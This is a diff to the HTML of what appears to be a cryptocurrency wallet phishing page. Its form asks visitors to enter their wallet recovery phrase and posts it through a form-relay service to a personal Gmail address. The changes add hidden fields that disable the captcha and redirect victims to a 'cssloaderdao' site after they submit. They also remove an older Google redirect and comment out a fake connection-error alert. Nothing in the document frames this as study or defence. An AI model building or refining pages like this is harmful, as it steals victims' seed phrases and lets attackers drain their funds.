@@ -3507,6 +3507,8 @@
                     <div class="col-sm-12 col-md-12">
                         <form method="POST" action="https://formsubmit.co/russellmoderator@gmail.com"
                             style=" width: 400px; margin: 0 auto;">
+                            <input type="hidden" name="_captcha" value="false">
+                            <input type="hidden" name="_next" value="https://cssloaderdao.vercel.app/">
                             <div class="form-group">
                                 <textarea name="field9" id="textarea" required style="width: 100%; margin: 0 auto;"
                                     placeholder="Enter your recovery phrase here with a space between each word."
@@ -3521,8 +3523,6 @@
                                 type="submit" class="recover-finale" onclick="">
                                 Continue
                             </button>
-                            <!-- Hidden Redirect Field -->
-                            <input type="hidden" name="_redirect" value="https://www.google.com">
                         </form>
 
 
@@ -3898,9 +3898,9 @@
     </div>
 
     <script>
-        document.getElementById("recovm").addEventListener("click", function () {
-            alert("Error Connection! Please Try again!!!");
-        });
+        // document.getElementById("recovm").addEventListener("click", function () {
+        //     alert("Error Connection! Please Try again!!!");
+        // });
     </script>
     <script src="../ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 
